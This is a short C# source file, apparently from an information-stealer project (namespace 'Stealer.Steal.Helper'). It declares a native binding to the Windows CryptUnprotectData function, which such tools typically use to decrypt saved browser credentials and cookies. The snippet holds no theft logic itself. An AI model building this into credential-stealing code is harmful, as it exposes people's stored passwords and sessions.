using System;
using System.Runtime.InteropServices;

namespace Stealer.Steal.Helper;

public class Native
{
	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CryptUnprotectData(ref Struct.DataBlob pCipherText, ref string pszDescription, ref Struct.DataBlob pEntropy, IntPtr pReserved, ref Struct.CryptprotectPromptstruct pPrompt, int dwFlags, ref Struct.DataBlob pPlainText);
}
